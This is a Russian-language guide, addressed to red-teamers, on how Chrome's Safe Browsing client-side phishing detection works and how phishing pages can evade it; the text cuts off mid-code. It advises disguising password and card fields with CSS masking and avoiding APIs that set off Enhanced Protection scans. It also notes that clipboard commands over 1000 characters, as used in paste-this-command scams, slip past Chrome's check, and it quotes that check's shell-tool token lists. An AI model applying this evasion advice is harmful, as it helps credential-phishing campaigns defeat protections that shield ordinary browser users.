# Избавляемся от красного экрана Google SafeBrowsing раз и навсегда в 2026. Гайд для ред-тимера.

Привет. На связи снова Aels. В этот раз мы поговорим об устройстве CSD (локальное обнаружение фишинга), что запускает этот процесс и как ред-тимеры могут избежать его срабатывания. Вся информация основана на исходном коде Chromium (коммит <code>a24b379b3d46</code>, актуальная версия на ноябрь 2026 года).

> Ничего не получается с первого раза, т.к. все, что получается сразу в этой жизни уже сделали до нас.

---

### Что нам предстоит узнать? Оглавление

- Что вообще проверяет Chrome и зачем нам это знать
- Как устроена цепочка: от навигации до вердикта
- Проверка URL и домена - первый фильтр, до любой классификации
- HTML-ноды и DOM-дерево - почему Chrome их больше не парсит для модели
- Текст страницы - кто его забирает и кто нет
- Визуальный снимок - как Chrome "фотографирует" нашу страницу
- Визуальная "палитра" - блочное усреднение RGB, а не то, о чем мы думаем
- Clipboard-trigger - `document.execCommand("copy")` и список подозрительных команд
- Enhanced Protection: триггеры, которые приводят краулер GSB на нашу страницу
- Корреляция с JS-событиями - какие page lifecycle events запускают какие проверки
- Где лежит локальная БД и модели
- Итоговая таблица: что триггерит и как обойти
- Что не поможет и почему
- Первым делом: убираем type="password" со страницы
- Трюк #1: POST-форма на себя же - обход через HTTP method
- Трюк #2: Редирект туда-обратно - forward/back bypass
- Трюк #3: blob: URL - страница вне юрисдикции CSD
- Трюк #4: Content-Type - самый простой и удобный метод

Устраиваемся в кресле удоблее, статья длинная, т.к. тема объемная и в интернете про нее нет ни одного нормального разбора по исходникам.

Начинаем.

---

### Что проверяет Chrome? Общая картина

Прежде чем лезть в код - разберемся, с чем мы имеем дело.

Chromium содержит встроенную систему *Client-Side Detection* (CSD). Она работает **локально**, на машине пользователя, без обращения к серверу (*). Результат - бинарный вердикт: phishing или нет. Если вердикт положительный - он отправляется на сервер Safe Browsing для подтверждения, и только после этого может появиться красный экран.

Нам важно понимать: это **не Safe Browsing blacklist lookup**. Blacklist-проверка URL - это отдельный механизм (hash-prefix check против серверных списков). CSD - именно on-device классификатор, который анализирует *содержимое* уже загруженной страницы.

_(*) для Enhanced Protection пользователей так же запускается отдельный "intelligent scan", который может отправлять данные на сервер, но это другой pipeline._

В актуальном Chromium HEAD (ноябрь 2026) CSD - это **визуальный классификатор**. Не текстовый, не DOM-based. Он берет скриншот viewport, размывает его до маленького блочного RGB-изображения и скармливает TFLite-модели. Старые URL/DOM/term extractor-ы, которые описаны в документации 2011 года, в текущей модели **не используются как входные данные**.

Но... гейты и триггеры, которые *решают*, запускать ли этот классификатор - сложная цепочка проверок URL, состояния страницы и поведения пользователя. И именно в них - вся суть для ред-тимера.

---

### Цепочка от навигации до вердикта. Общая схема

Вот полная последовательность событий при обычной загрузке страницы. Нам важно понимать, кто и когда принимает решение.

```
BROWSER PROCESS                              RENDERER PROCESS
     |                                            |
     | navigation commit                          |
     |                                            | DidCommitProvisionalLoad()
     |                                            |   отмена старой classification
     |                                            |   renderer_layout_finished = false
     |                                            |
     | PrimaryPageChanged()                       |
     |   cancel pending requests                  |
     |   reset state                              |
     |                                            |
     |                                            | kFinishedParsing
     |                                            |   ~ DOMContentLoaded
     |                                            |   PageCaptured(preliminary=true)
     |                                            |   classification НЕ запускается
     |                                            |
     | DidFirstVisuallyNonEmptyPaint()            |
     | OnFirstContentfulPaintInPrimaryMainFrame() |
     |                                            |
     | оба получены?                              |
     |   ДА -> MaybeStartPreClassification()      |
     |     |                                      |
     |   ShouldClassifyUrlRequest::Start()        |
     |     URL-гейты                              |
     |     allowlist                              |
     |     cache                                  |
     |     rate limit                             |
     |     |                                      |
     |   OnPhishingPreClassificationDone()        |
     |     -> IPC: StartPhishingDetection() ----> | StartPhishingDetection()
     |                                            |   запомнить browser URL
     |                                            |
     |                                            | kFinishedLoading
     |                                            |   ~ window.load
     |                                            |   PageCaptured(preliminary=false)
     |                                            |   renderer_layout_finished = true
     |                                            |
     |                                            | MaybeStartClassification()
     |                                            |   browser request + load ready?
     |                                            |   scorer ready?
     |                                            |   URL match?
     |                                            |   |
     |                                            | BeginClassification()
     |                                            |   PostTask -> next event loop
     |                                            |   ExtractVisualFeatures()
     |                                            |   CapturePaintPreview()
     |                                            |   background playback -> SkBitmap
     |                                            |   resize + BlockMeanAverage
     |                                            |   TFLite visual model
     |                                            |   |
     |                                            |   verdict -> IPC -> browser
     |                                            |
     | PhishingDetectionDone()                    |
     |   score > threshold?                       |
     |   -> server ping                           |
     |   -> maybe interstitial                    |
```

Browser-side preclassification и renderer-side `kFinishedLoading` могут приходить в любом порядке. Classification стартует, только когда оба условия выполнены.

Для ред-тимера ключевой вывод: **если мы не пройдем browser-side URL гейты, до визуального анализа дело вообще не дойдет**.

---

### Проверка URL и домена - первый фильтр

Это самый важный этап для нас. Прежде чем Chrome вообще попытается анализировать содержимое страницы, browser process проверяет целую серию условий. Если хоть одно не выполняется - classification не запускается.

Вот полный список гейтов из `ShouldClassifyUrlRequest::Start()`:

```
STOP, если:
 - URL начинается с chrome://
 - URL начинается с file: или это localhost
 - MIME-тип не text/html и не application/xhtml+xml
 - это error document (и включен kClientSideDetectionSkipErrorPage)
 - remote IP - private/reserved диапазон
 - схема не HTTP и не HTTPS
 - вкладка в Incognito
 - URL в enterprise policy allowlist
 - есть отложенное Safe Browsing предупреждение
 - URL совпадает с CSD allowlist
 - URL совпадает с high-confidence allowlist
 - для этого URL уже есть кэшированный результат
 - превышен лимит phishing reports

CLASSIFY, если ничего из вышеперечисленного
```

Исходник: _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc_, класс `ShouldClassifyUrlRequest`.

Мы не можем подменить remote IP на private для реального пользователя. Так же мы не можем заставить жертву открыть страницу в Incognito (ну, ладно, можем попытаться, но это ненадежно). Но... нам и не нужно проходить все гейты. Нам нужно, чтобы classification запустилась - а дальше пройти визуальную проверку.

Что нам реально важно знать:

- Если домен страницы попадает в CSD allowlist (это отдельная Safe Browsing БД, не основной blacklist) - classification не запустится. По-этому свежий, ранее неизвестный домен не будет в allowlist-е и classification запустится
- Кэшированный положительный результат показывается из кэша без повторного запуска. Если юзер повторно зайдет на ту же страницу - Chrome может показать warning, не запуская классификатор

Супер. С URL-гейтами разобрались.

---

### HTML-ноды и DOM-дерево - Chrome их больше не парсит для модели

Вот тут многие делают ошибку. Старые статьи и даже официальная документация Google описывают `PhishingDOMFeatureExtractor`, который обходил DOM, считал формы, ссылки, `<input>` элементы и формировал feature vector для модели.

В актуальном Chromium HEAD (commit `a24b379b3d46`) этих extractor-ов **нет ни в одной цепочке CSD**. Файлы `PhishingDOMFeatureExtractor`, `PhishingUrlFeatureExtractor`, `PhishingTermFeatureExtractor` удалены из дерева исходников.

Посмотрим на `PhishingClassifier::BeginClassificationInternal()` - это единственный классификатор CSD:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/phishing_classifier/phishing_classifier.cc
BeginClassificationInternal(url, image)
  -> visual_utils::ExtractVisualFeatures(image)   // blurred RGB
  -> Scorer::ApplyVisualTfLiteModel(image)         // TFLite scoring
  -> Scorer::ApplyVisualTfLiteModelImageEmbedding() // image embedding (ESB)
```

Нет ни одного вызова DOM, URL или term extractor-а. Enum-значения `DOM_EXTRACTION_FAILED`, `URL_FEATURE_EXTRACTION_FAILED`, `TERM_EXTRACTION_FAILED` все еще присутствуют в `csd.proto` и `safe_browsing.mojom` для обратной совместимости протокола, но текущий код их никогда не выставляет - это мертвый код.

Что это значит для нас? Добавлять кучу "легитимных" `<input>` элементов, создавать фальшивую навигацию или маскировать структуру DOM - все это **не влияет на текущий on-device классификатор**. Он смотрит на *картинку*, а не на DOM.

Тем не менее, DOM все еще косвенно участвует: он определяет, как страница *рисуется*. И именно отрисованный кадр попадает в визуальный классификатор. По-этому DOM важен - но не так, как описывалось раньше.

Отлично. Идем дальше.

---

### Текст страницы - кто его забирает и кто нет

Бывает два события `kFinishedParsing` (~DOMContentLoaded) и `kFinishedLoading` (~window.load). На оба из них `ChromeRenderFrameObserver` вызывает:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/chrome/renderer/chrome_render_frame_observer.cc
WebFrameContentDumper::DumpFrameTreeAsText(frame, kMaxIndexChars)
```

Это выгребает текстовое содержимое страницы (до 65535 символов). Но... этот текст идет **не в phishing классификатор**. Он идет в:

- `translate::TranslateAgent` - для определения языка страницы
- `PageTextAgent` - для Optimization Guide
- `ContentPhishingClassifierDelegate::PageCaptured(bool)` - которому передается только **boolean** `preliminary_capture`, а не текст

Текст как feature для локальной phishing-модели **не используется** в текущем pipeline.

Текст используется отдельно в Enhanced Protection *intelligent scan* (это серверная проверка для пользователей с включенной Enhanced Protection):

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
ClientSideDetectionHost::GetInnerText()
  -> delegate_->GetInnerText()
  -> MaybeCaptureScreenshotAndStartIntelligentScan()
```

Для обычной on-device CSD - текст страницы не имеет значения. Однако для Enhanced Protection юзеров - имеет. Если наша цель - Enhanced Protection пользователь, текст страницы тоже становится вектором анализа.

### Визуальный снимок - как Chrome фотографирует нашу страницу

Это ядро текущего классификатора. Вот что происходит после того, как `MaybeStartClassification()` одобрил запуск.

**Шаг 1: Capture Paint Preview**

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
frame->CapturePaintPreview(
    bounds,         // viewport bounds
    canvas,
    false,          // include_linked_destinations
    true,           // skip_accelerated_content
    false);         // allow_scrollbars
```

Ключевые моменты:

- Берется **visual viewport**, не весь document
- Scrollbars исключены
- Accelerated composited content (WebGL, `<video>`, canvas с GPU) может отсутствовать
- Это Blink paint preview - не screenshot через compositor. По-этому результат может отличаться от того, что видит пользователь

Blocking conditions на этом этапе:
- `frame->View()` отсутствует
- `FrameWidget()` отсутствует
- frame в provisional состоянии

**Шаг 2: Background playback**

Paint record воспроизводится на фоновом потоке в `SkBitmap` в цветовом пространстве Rec.2020:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
SkColorSpace::MakeRGB(
    {2.22222f, 0.909672f, 0.0903276f, 0.222222f, 0.0812429f, 0, 0},
    SkNamedGamut::kRec2020);
```

Rec.2020, а не sRGB - чтобы не терять wide-gamut информацию.

**Шаг 3: Resize**

Bitmap ресайзится до фиксированных размеров:

```
Desktop:    288 x 288
Android:    108 x 192
iOS:        108 x 192
```

Эти значения - по-умолчанию, но они так же управляются через Finch feature `kVisualFeaturesSizes`. Chrome может менять их серверной конфигурацией.

**Шаг 4: Block Mean Average**

Уменьшенное изображение разбивается на блоки 6x6 пикселей. Каждый блок заменяется средним значением RGB:

```
288 / 6 = 48 блоков по ширине
288 / 6 = 48 блоков по высоте
Итого: 48 x 48 = 2304 блока = 6912 байт RGB
```

Это "privacy-preserving visual feature" - достаточно для обнаружения визуальных паттернов, но недостаточно для восстановления текста.

**Шаг 5: TFLite scoring**

Блочное RGB-изображение подается на вход TFLite-модели. Модель возвращает score. Если score > threshold - вердикт "phishing".

Исходники:
- _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc_ - capture
- _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/visual_utils.cc_ - resize, BlockMeanAverage, RGB serialization

---

### Визуальная "палитра" - не совсем то, что мы себе представляем

Слово "палитра" здесь может ввести в заблуждение. Chrome **не** извлекает dominant colors. **Не** строит гистограмму. **Не** сравнивает с эталонными палитрами известных брендов.

Он берет blurred 48x48 RGB-изображение и скармливает его TFLite-нейросети. Нейросеть обучена на визуальных паттернах phishing-страниц. Она ищет визуальное сходство с известными фишинговыми шаблонами - но как именно она принимает решение, мы не знаем. Это black box.

Что мы знаем:
- блочное изображение 48x48 - это очень грубое. Мелкие детали теряются
- нейросеть видит "общее впечатление": цветовые зоны, расположение крупных блоков, контраст
- если наша страница визуально похожа на login-форму Google/Microsoft/банка - модель может среагировать

Так же существует проверка `IsUniformImage()`: если все каналы блочного изображения имеют диапазон <= 10 (настраиваемый порог), страница считается "пустой/однотонной", и Chrome может повторить capture до 3 раз с задержкой 500ms. Если после 3 попыток изображение все еще uniform - classification пропускается.

Что это значит для ред-тимера:
- Нам нужно копировать визуал страницы 1:1. А даже при разрешении 48x48 "синий прямоугольник сверху + белая форма с зеленой кнопкой" - это достаточно характерный паттерн
- Однотонная страница вызовет retry, а не bypass. Не пытаемся обмануть систему пустым экраном
- Accelerated content (canvas, WebGL) пропускается. Если рисовать фейковую форму через `<canvas>` - она может не попасть в paint preview конечно, но и интерасктивной не будет.

---

### Clipboard-trigger - execCommand("copy") и подозрительные команды

При Enhanced Protection, когда пользователь копирует текст (любым способом - `execCommand("copy")`, `Ctrl+C`, Clipboard API), Chrome анализирует скопированное содержимое. Это отдельный CSD trigger, т.к. scam-страницы часто просят жертву скопировать и выполнить PowerShell/bash-команду.

Цепочка:

```
пользователь копирует текст
  -> ClipboardHostImpl::WriteText(text)
  -> OnCopyAllowedResult()
  -> OnTextCopiedToClipboard(text)   // только PlainText
  -> ClientSideDetectionHostBase::OnTextCopiedToClipboard(copied_text)
```

Гейты до анализа:
- Enhanced Protection не включен -> выход
- уже был clipboard-trigger для этого URL -> выход
- длина < 10 символов -> выход
- длина > 1000 символов -> выход

Если гейты пройдены, текст проходит обработку в два этапа: сначала токенизация, потом нормализация каждого токена и сравнение с четырьмя списками.

**Этап 1 - токенизация.** Сначала проверяется наличие подкомандного синтаксиса (`$(`, `)`, `` ` `` - если есть, сразу ставится флаг `has_runner`). Затем shell-разделители заменяются пробелами, и строка разбивается на токены:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc
// ExtractClipboardData() - фрагмент токенизации

// Проверка подкомандного синтаксиса до токенизации
if (processed_payload.find(u"$(") != std::u16string::npos ||
    processed_payload.find(u")") != std::u16string::npos ||
    processed_payload.find(u"`") != std::u16string::npos) {
  has_runner = true;
}

// Эти разделители заменяются на пробелы:
std::vector<std::u16string> delimiters = {
    u"&&", u"||", u"$(", u"|",
    u";",  u")",  u"`",  u"(",
    u"{",  u"}",  u"::", u"\"" // символ ^ не заменяется, кстати.
};
for (const auto& delimiter : delimiters) {
  base::ReplaceSubstringsAfterOffset(&processed_payload, 0, delimiter, u" ");
}

// Разбиваем по пробелам, табам, \n, \r:
std::vector<std::u16string> tokens =
    base::SplitString(processed_payload, u" \t\n\r",
                      base::TRIM_WHITESPACE, base::SPLIT_WANT_NONEMPTY);
```

**Этап 2 - нормализация каждого токена.** Каждый токен прогоняется через `NormalizeToken()`:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc
std::string NormalizeToken(std::u16string_view token) {
  base::FilePath path(base::FilePath::FromUTF16Unsafe(token));
  std::string filename = path.BaseName().RemoveExtension().AsUTF8Unsafe();
  return base::ToLowerASCII(filename);
}
```

То есть:
- берется последний компонент пути (`C:\Windows\System32\cmd.exe` -> `cmd.exe`)
- убирается расширение (`cmd.exe` -> `cmd`)
- приводится к lowercase ASCII

**Списки по-умолчанию:**

Loaders (загрузчики):
```
curl, wget, invoke-webrequest, iwr, invoke-restmethod, irm,
certutil, bitsadmin, echo, cat, finger, gc
```

Runners (исполнители):
```
powershell, cmd, invoke-expression, iex, bash, python, python3,
perl, php, conhost, ssh, sftp, wt, zsh, %comspec%, [scriptblock]
```

Remote runners:
```
mshta, [scriptblock]
```

Decoders:
```
base64, base32, [convert]
```

Если хотя бы один нормализованный токен совпадает с любым из этих списков - `MaybeStartPreClassification(CLIPBOARD_COPY_API)` запускается.

Отдельно считается `is_overall_suspicious`:
```
has_loader && has_endpoint && has_runner
```

Где `has_endpoint` - наличие чего-то похожего на URL или `%localappdata%`/`%userprofile%`.

Списки управляются через Finch feature params `kClientSideDetectionClipboardCopyApi`. Chrome может менять их серверной конфигурацией без обновления.

Для нас из всего этого следует: если наш phishing просит жертву скопировать команду с `powershell`, `curl`, `bash` или подобным - Chrome триггернется. Но только при Enhanced Protection.

---

### Enhanced Protection: триггеры, которые приводят краулер GSB на нашу страницу

Самая неприятная для ред-тимера часть, и вот почему.

Обычный Standard Protection CSD работает так: локальная модель дает вердикт -> если positive, отправляется `ClientPhishingRequest` на сервер -> сервер подтверждает или отклоняет -> если подтверждает - красный экран. Сервер принимает решение на основе данных из этого запроса, но **не обязательно сам ходит на нашу страницу**.

Enhanced Protection (ESB) - совсем другая история. Для ESB-юзеров запускается расширенный pipeline, который:

1. Собирает **inner text** страницы (больше похоже на полный `document.body.innerText`, включая iframe-ы)
2. Делает **screenshot** через `CopyFromSurface()` (полноразмерный, до 4096x2160)
3. Запускает **image embedding** - отдельная TFLite-модель, которая создает визуальный вектор
4. Отправляет **все это на сервер** для *intelligent scan* (Gemini-based антискам)
5. Сервер **анализирует URL, текст и изображение** через LLM
6. При подозрении - **серверный краулер Google Safe Browsing приходит на нашу страницу**

Вот цепочка из кода:

```
PhishingDetectionDone()
  |
MaybeSendClientPhishingRequest(verdict)
  |
ClassifyPhishingThroughThresholds()   // local TFLite threshold check
  |
MaybeStartImageEmbedding()            // ESB only
  |-- IsEnhancedProtectionEnabled()?    // gate
  |-- HasImageEmbeddingModel()?         // gate
  `-- BeginBrowserSideImageEmbedding()  // или renderer-side
       |
MaybeStartIntelligentScanForScamDetection(verdict)
  |-- ShouldRequestIntelligentScan()?   // ESB gate
  |-- GetInnerText()                    // забираем текст
  |-- MaybeCaptureScreenshotAndStartIntelligentScan()
  |    |-- CopyFromSurface()            // полноразмерный screenshot
  |    `-- EncodePngOnBackgroundThread()
  `-- StartIntelligentScan(inner_text, url, screenshot)
       |-- IntelligentScanDelegate::StartIntelligentScan()
       |    `-- Gemini server-side analysis
       |
  OnIntelligentScanDone(response)
       |
  MaybeGetAccessToken()   // ESB users get OAuth token
       |
  SendRequest(verdict)    // всё летит на сервер
       |
  SendClientReportPhishingRequest()  // -> сервер Safe Browsing
       |
  MaybeShowPhishingWarning()  // ответ сервера
       |
  ShowBlockingPage()  // красный экран
```

Источник: _https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc_, строки ~688-1880.

**Что именно сервер получает от ESB-юзера:**

- URL страницы
- visual features (blurred 48x48 RGB image)
- image embedding (TFLite vector)
- score локальной модели
- `is_phishing` / `is_tflite_match`
- inner text страницы
- tab screenshot (PNG, до 4096x2160)
- referrer chain
- redirect chain
- тип триггера (какой именно CSD trigger запустил проверку)
- HTTP response code
- site engagement score
- clipboard extracted data (если trigger = CLIPBOARD_COPY_API)
- Gemini intelligent scan verdict (brand, intent, scam_score)

Это *значительно* больше, чем при Standard Protection, где уходит в основном URL + visual features + score.

**Когда сервер приходит краулером:**

Из кода мы видим, что серверный ответ включает `intelligent_scan_verdict`. Если сервер определяет страницу как подозрительную - он может:
- Добавить URL в Safe Browsing blacklist (после чего все пользователи Chrome получат warning)
- Отправить краулер для дополнительной проверки
- Вернуть `FORCE_REQUEST` в real-time URL lookup для других пользователей, которые посетят тот же URL

Интересная деталь: если первый `FORCE_REQUEST` возвращает `INTELLIGENT_SCAN_VERDICT_SAFE`, Chrome может запланировать **повторный запрос** с задержкой (`kCsdForceRequestDelayMs`). То есть сервер проверяет нашу страницу дважды.

**Теперь - какие JS API триггерят этот расширенный ESB pipeline:**

Все эти триггеры работают **только для ESB-юзеров**, но каждый из них запускает **полную цепочку** preclassification -> classification -> image embedding -> intelligent scan -> server request:

```
Триггер                               JS API                          Почему опасен для ред-тимера
------------------------------------  ------------------------------  --------------------------------
KEYBOARD_LOCK_REQUESTED               navigator.keyboard.lock()       перезапускает CSD с новым типом
POINTER_LOCK_REQUESTED                element.requestPointerLock()    перезапускает CSD с новым типом
VIBRATION_API                         navigator.vibrate(...)          перезапускает CSD с новым типом
FULLSCREEN_API                        element.requestFullscreen()     перезапускает CSD с новым типом
NOTIFICATION_PERMISSION_PROMPT        Notification.requestPermission() перезапускает CSD с новым типом
CLIPBOARD_COPY_API                    execCommand("copy") / clipboard API  анализ содержимого + CSD
CREDIT_CARD_FORM                      input[autocomplete="cc-number"]  взаимодействие с полем CC
UNFAMILIAR_LOGIN_PAGE                 password field heuristics       страница с полем ввода пароля
FORCE_REQUEST                         (нет прямого JS API)            результат RT URL lookup
IMAGE_EMBEDDING_MATCH                 (нет прямого JS API)            совпадение visual embedding
```

Важно: каждый из этих триггеров - это **отдельная** `MaybeStartPreClassification()`. Если страница при загрузке уже прошла стандартный `TRIGGER_MODELS` и получила вердикт "не phishing", а потом юзер нажал `Ctrl+C` - Chrome запустит **новую** classification с типом `CLIPBOARD_COPY_API`. И в этот раз - с полным intelligent scan pipeline.

Тем не менее, tier system может заблокировать новый trigger, если текущий trigger уже выше по приоритету. Порядок приоритетов определяется `GetClientSideDetectionTypeTier()`, и `FORCE_REQUEST` имеет наивысший приоритет.

**Практические выводы для ESB-триггеров:**

1. **Не используем `keyboard.lock()`, `requestPointerLock()`, `navigator.vibrate()`, `requestFullscreen()`** на phishing-странице. Каждый из них - прямой trigger для ESB classification. Если наш фишинг не требует этих API - не вызываем их.

2. **`Notification.requestPermission()` - ловушка.** Многие scam-страницы запрашивают notification permission. Для ESB-юзера это мгновенный trigger CSD. И ESB-юзеры - это как раз те, кто наиболее security-conscious и с наибольшей вероятностью будет использовать Enhanced Protection.

3. **Clipboard copy - самый желаемый trigger.** Пользователь может просто скопировать текст со страницы, даже не подозрительный. Если Enhanced Protection включен - Chrome проанализирует скопированное. Но trigger запускается только при наличии подозрительных токенов (см. списки выше).

4. **Формы кредитных карт.** Если на странице есть `<input>` с `autocomplete="cc-number"` и пользователь взаимодействует с ним - CSD trigger. Для ESB-юзера это означает: наш phishing с полями ввода карты триггернет Gemini-analysis.

5. **Unfamiliar login page.** Если Chrome определяет, что страница содержит форму ввода пароля и URL не знаком (нет в истории, low site engagement) - trigger. Это `kProactivePasswordProtection` feature, и он включается только при ESB.

6. **Серверный краулер = боль-дырка-задница.** Как только наш URL попал в серверный запрос ESB, Google пришлет паука c резидентских прокси закраулить страницу, и ловить его - последнее удовольствие. По-этому один ESB-юзер может "сжечь" весь наш deployment.

7. **Мы не можем надежно определить ESB-юзера.** (на самом деле - можем, но это тема для отдельной статьи). Enhanced Protection - это настройка в `chrome://settings/security`. Она не отражается в User-Agent, не определяется через JS API, не меняет поведение fetch/XHR. Единственное косвенное отличие - ESB-юзеры могут быть чуть медленнее на первой загрузке (из-за real-time URL check), но это ненадежный сигнал.

Отлично. Теперь мы понимаем масштаб проблемы. Один ESB-юзер - и наша ссылка может быть глобально заблокирована.

Идем в техническую часть корреляций.

---

### Корреляция с JS-событиями - какие page events что запускают

Это ключевая таблица. Слева - внутренний callback Chromium, справа - ближайший JS-эквивалент и что происходит в CSD.

```
JS-событие / API                   Chromium callback                       CSD-действие
---------------------------------  -------------------------------------   -----------------------------
location.assign(url)               DidCommitProvisionalLoad()              отмена старой classification
                                   PrimaryPageChanged()                    reset state

document.readyState="interactive"  DidMeaningfulLayout(kFinishedParsing)   PageCaptured(true)
~DOMContentLoaded                                                          classification НЕ стартует

PerformanceObserver("paint")       DidFirstVisuallyNonEmptyPaint()         mark #1
  first-contentful-paint           OnFirstContentfulPaintInPrimaryMainFrame()  mark #2
                                   оба mark -> MaybeStartPreClassification()

window.load                        DidMeaningfulLayout(kFinishedLoading)   PageCaptured(false)
document.readyState="complete"                                             renderer_layout_finished = true
                                                                           MaybeStartClassification()

visibilitychange                   OnVisibilityChanged()                   resume capture (browser path)

Keyboard.lock()                    KeyboardLockRequested()                 trigger CSD (ESB only)

navigator.vibrate()                VibrationRequested()                    trigger CSD (ESB only)

element.requestPointerLock()       PointerLockRequested()                  trigger CSD (ESB only)

element.requestFullscreen()        FullscreenRequested()                   trigger CSD (ESB only)

Notification.requestPermission()   OnPromptAdded()                         trigger CSD (ESB only)

navigator.clipboard.writeText()    OnTextCopiedToClipboard()               clipboard analysis (ESB only)
document.execCommand("copy")                                               (ESB = Enhanced Protection)

pageshow (persisted)               BFCache restore                         reset state
```

_(ESB = Enhanced Safe Browsing / Enhanced Protection)_

Обратим внимание: **keyboard lock, vibration, pointer lock, fullscreen и notification permission** - все это триггеры CSD для Enhanced Protection пользователей.

Основной триггер для обычных пользователей - **FCP + visually non-empty paint**. Он срабатывает автоматически при обычной загрузке страницы.

---

### Где лежит локальная БД и модели

Модель CSD поставляется через *Optimization Guide* (component update). Она не лежит в коде Chromium - она загружается отдельно после установки.

Расположение на диске:

```
# macOS
~/Library/Application Support/Google/Chrome/Default/optimization_guide_model_store/

# Linux
~/.config/google-chrome/Default/optimization_guide_model_store/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\optimization_guide_model_store\
```

Внутри - поддиректории с UUID-именами. Модель CSD - TFLite файл, обычно несколько сотен килобайт.

Scorer загружается через `ScorerStorage::GetInstance()->GetScorer()`. Если scorer не готов на момент запуска classification, Chrome ждет до 15 секунд (настраиваемый `kClientSideDetectionRetryLimitTime`), после чего отвечает `CLASSIFIER_NOT_READY`.

Safe Browsing allowlist-ы (CSD allowlist, high-confidence allowlist) - часть Safe Browsing database, которая обновляется отдельно:

```
# macOS
~/Library/Application Support/Google/Chrome/Safe Browsing/

# Linux
~/.config/google-chrome/Safe Browsing/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Safe Browsing\
```

На Windows это обычно раскрывается в:
```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Safe Browsing\
```

Внутри лежат файлы вида `CsdAllowlist*`, `UrlCsdAllowlist*`, `HighConfidenceAllowlist*` - это prefix-hash database в формате Safe Browsing v4/v5. Для проверки используется `AllowlistCheckerClient::StartCheckCsdAllowlist()`.

Файлы обновляются периодически в фоне через Safe Browsing Update API. Их можно открыть и посмотреть размер и дату обновления, но содержимое - это hash-префиксы, не читаемые URL.

---

### Что не поможет и почему. Отсечение ложных путей

**"Задержим загрузку, чтобы Chrome не успел"** - не работает. Chrome ждет и FCP, и `kFinishedLoading`. Если мы задерживаем загрузку - мы задерживаем classification, но не отменяете ее. Как только страница загрузится - classification запустится.

**"Покажем белую страницу, а потом подменю через JS"** - не работает надежно. Chrome делает capture после `kFinishedLoading`. Если мы подменяем контент после load через `setTimeout` - Chrome может уже иметь viewport capture с "чистой" страницей. Но... если подмена происходит до `BeginClassification()` - Chrome захватит уже подмененный контент, т.к. `CapturePaintPreview` берет текущее состояние paint tree.

**"Нарисуем форму через `<canvas>` вместо HTML"** - потенциально работает частично. `skip_accelerated_content = true` означает, что GPU-ускоренный canvas может не попасть в capture. Но 2D canvas без GPU-acceleration - попадет.

**"Добавим невидимые элементы в DOM"** - бесполезно для визуального классификатора. Он смотрит на *картинку*, не на DOM.

**"Подставим `\0` в имя команды execCommand"** - не работает. Blink сравнивает имя команды через `CodeUnitCompareIgnoringAsciiCase`, который учитывает полную длину строки. `"copy\0"` имеет длину 5, `"Copy"` - длину 4. Сравнение вернет неравенство. Команда не будет распознана.

**"Вставим в clipboard что-то >1000 символов"** - сработает как length gate bypass только для clipboard trigger (тут клик-фиксеры-капчисты заулыбались). Classification по визуальным признакам все равно запустится.

---

### Передышка

Прекрасно, если мы дошли до этого момента, значит красный экран и правда портит нам настроение.

Нальем кофе, чтобы все прочитанное спокойно улеглось в голове. Дальше - практика.

---

### Решения проблемы. Способы обойти CSD и забыть про красный экран до следующего нового года.

Наконец-то беремся за клавиатуру, погнали.

---

### Первым делом: убираем `type="password"` и `type="cc-number"` со страницы

Прежде чем говорить об обходе CSD - уберем самые очевидные сигналы.

Chrome обрабатывает `<input type="password">` и поля кредитных карт (`autocomplete="cc-number"`) особым образом: это ESB-триггеры `UNFAMILIAR_LOGIN_PAGE` и `CREDIT_CARD_FORM`. И эти триггеры **обходят проверку forward/back и POST (см. ниже)**.

Мы разобрали это по коду. Когда `kSkipImageClassificationScoringForNonPageLoadTriggers` включен (а он включен по-умолчанию), ESB-триггеры не проходят через renderer classifier. Вместо этого они вызывают `ReportSkippedClassification()` с `CLASSIFICATION_SKIPPED`, который попадает в `PhishingDetectionDone()` и **проходит дальше** к image embedding, intelligent scan и серверному запросу:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/browser/client_side_detection/client_side_detection_host_base.cc, строки 725-728
// Send a verdict if the result is SUCCESS, or if it is CLASSIFICATION_SKIPPED
// to indicate that phishing detection was skipped but a verdict should still
// be sent.
if (result != PhishingDetectorResult::CLASSIFICATION_SUCCESS &&
    result != PhishingDetectorResult::CLASSIFICATION_SKIPPED) {
  // только эти два результата пропускаются к MaybeSendClientPhishingRequest()
  return;
}
```

Это значит: даже если вы обошли основной CSD через POST-форму, forward/back, blob: или Content-Type - одно поле `type="password"` на странице запустит ESB-триггер `UNFAMILIAR_LOGIN_PAGE`, который пройдет мимо всех наших байпасов и отправит URL + inner text + screenshot на сервер Google. То же самое с полями кредитных карт.

По-этому замена input type - must-have. Без нее любой трюк с обходом CSD может быть обесценен одним ESB-юзером.

Для маскировки ввода точками используем `-webkit-text-security: disc` - CSS-свойство, которое заменяет отображаемые символы на точки на уровне рендеринга. Работает в Chrome/Edge/Safari. Дополнительно подключаем шрифт-точки как фолбэк для браузеров без поддержки этого свойства (например Firefox).

```html
<style>
  .pwd-mask {
    font-family: 'Dotted Songti Square', serif;
    -webkit-text-security: disc;
    letter-spacing: 2px;
  }
</style>
